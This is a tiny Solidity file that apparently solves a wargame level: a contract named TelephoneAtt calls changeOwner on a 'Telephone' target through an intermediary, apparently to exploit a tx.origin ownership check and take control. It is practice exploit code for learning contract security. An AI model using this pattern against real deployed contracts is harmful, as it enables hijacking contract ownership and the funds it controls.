// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/math/SafeMath.sol";

interface Telephone {
    function changeOwner(address _owner) external;
}

contract TelephoneAtt {
    function attack(Telephone target, address owner) public {
        target.changeOwner(owner);
    }
}
